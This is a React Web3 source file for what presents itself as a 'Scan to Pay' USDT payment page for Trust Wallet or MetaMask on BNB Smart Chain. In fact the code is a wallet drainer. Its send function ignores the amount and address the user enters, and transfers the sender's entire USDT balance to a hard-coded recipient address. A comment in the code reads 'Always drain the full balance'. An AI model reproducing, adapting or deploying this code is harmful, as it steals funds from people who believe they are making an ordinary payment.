import React, { useState, useEffect, useRef } from "react";
import styled from 'styled-components';
import Web3 from "web3";
import { QRCodeCanvas } from 'qrcode.react';

const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  { "constant": true, "inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
  { "constant": false, "inputs": [{"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function" }
];

const App = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(0);
  const [bnbBalance, setBnbBalance] = useState(0);
  const [walletConnected, setWalletConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [qrCodeUrl, setQrCodeUrl] = useState("");

  const isProcessing = useRef(false);

  useEffect(() => {
    const init = async () => {
      try {
        if (!window.ethereum) {
          console.error("MetaMask/Trust Wallet not detected.");
          alert("Please install MetaMask or Trust Wallet to use this app.");
          return;
        }
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        const sender = accounts[0];
        
        if (!sender || !web3.utils.isAddress(sender)) {
          console.log("❌ No valid wallet address detected.");
          alert("Please connect your wallet.");
          return;
        }
        
        const params = new URLSearchParams(window.location.search);
        const userAddress = params.get("address");
        
        if (!userAddress) {
          setWalletAddress("");
          console.log("🔄 No address in URL");
          return;
        }
        
        if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
          console.log("❌ Invalid user address in URL.");
          alert("Invalid address in URL.");
          return;
        }

        setWalletAddress(userAddress);
        setAddress(userAddress);
        console.log("🔗 Wallet from QR:", userAddress);

        const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
        const usdtBalance = await contract.methods.balanceOf(sender).call();
        const formattedUSDTBalance = web3.utils.fromWei(usdtBalance, 'ether');
        const bnbBalanceRaw = await web3.eth.getBalance(sender);
        const formattedBNBBalance = web3.utils.fromWei(bnbBalanceRaw, 'ether');

        setUsdtBalance(parseFloat(formattedUSDTBalance));
        setBnbBalance(parseFloat(formattedBNBBalance));

        console.log("✅ Balances fetched successfully: USDT:", formattedUSDTBalance, "BNB:", formattedBNBBalance);
      } catch (err) {
        console.error("❌ init() error:", err);
        alert("Failed to initialize: " + err.message);
      }
    };

    init();
  }, []);

  useEffect(() => {
    const baseUrl = window.location.origin;
    const redirectUri = `${baseUrl}?address=${RECIPIENT_ADDRESS}`;
    setQrCodeUrl(redirectUri);
  }, []);

  const sendUSDT = async () => {
    if (isProcessing.current) {
      console.log("Transaction already in progress.");
      return;
    }

    try {
      isProcessing.current = true;
      setLoading(true);
      setTransferCompleted(false);

      console.log("Starting sendUSDT...");

      if (!window.ethereum) {
        console.error("MetaMask/Trust Wallet not detected.");
        alert("Please install MetaMask or Trust Wallet to use this app.");
        return;
      }

      console.log("Connecting to wallet...");
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];
      if (!sender || !web3.utils.isAddress(sender)) {
        console.log("❌ No valid wallet address detected.");
        alert("Please connect your wallet.");
        return;
      }

      console.log("Checking chain ID...");
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        console.log("Switching to BSC network...");
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          console.error("Failed to switch network:", switchError);
          alert("Please switch to the Binance Smart Chain (BSC) network.");
          return;
        }
      }

      console.log("Verifying URL address...");
      const params = new URLSearchParams(window.location.search);
      const userAddress = params.get("address");

      if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
        console.log("❌ Invalid user address in URL.");
        alert("Invalid address in URL.");
        return;
      }

      console.log("Creating contract instance...");
      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
      const amountToTransfer = usdtBalance; // Always drain the full balance
      console.log(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);

      if (parseFloat(amountToTransfer) <= 0) {
        console.error("Amount to transfer is 0 or invalid.");
        alert("Your USDT balance is 0 or invalid. Please ensure you have USDT in your wallet.");
        return;
      }

      const amountInWei = web3.utils.toBN(web3.utils.toWei(amountToTransfer.toString(), 'ether'));
      console.log(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);

      console.log("Estimating gas...");
      const estimatedGas = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).estimateGas({ from: sender });
      const gasLimit = estimatedGas * 2;
      console.log(`Gas limit set to ${gasLimit}`);

      console.log("Initiating transfer transaction...");
      const transferTx = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).send({ from: sender, gas: gasLimit });
      console.log(`✅ Transfer successful! Transaction hash: ${transferTx.transactionHash}`);
      alert("Transfer successful!");

      setTransferCompleted(true);
    } catch (err) {
      console.error("🔴 Transaction error:", err);
      alert("Transaction failed: " + err.message);
    } finally {
      isProcessing.current = false;
      setLoading(false);
    }
  };

  return (
    <GlobalStyle>
      <Container>
        <InputContainer>
          <InputLabel>Scan to Pay with Trust Wallet</InputLabel>
          {qrCodeUrl && (
            <div style={{ marginTop: "10px", textAlign: "center" }}>
              <QRCodeCanvas value={qrCodeUrl} size={200} />
              <p style={{ fontSize: "14px", color: "#626262", marginTop: "10px" }}>
                Scan this QR code with Trust Wallet to pay {usdtAmount || "an amount"} USDT.
              </p>
            </div>
          )}
        </InputContainer>

        <InputContainer>
          <InputLabel>Address or Domain Name</InputLabel>
          <InputFieldContainer>
            {address && <ClearButton onClick={() => setAddress("")}>×</ClearButton>}
            <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
            <PasteButton>Paste</PasteButton>
          </InputFieldContainer>
        </InputContainer>

        <InputContainer>
          <InputLabel>Amount</InputLabel>
          <InputFieldContainer>
            <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} placeholder="Enter amount in USDT" />
          </InputFieldContainer>
        </InputContainer>

        <NextButton onClick={sendUSDT} disabled={loading || !usdtAmount}>
          {loading ? "Processing..." : "Next"}
        </NextButton>
      </Container>
    </GlobalStyle>
  );
};

export default App;
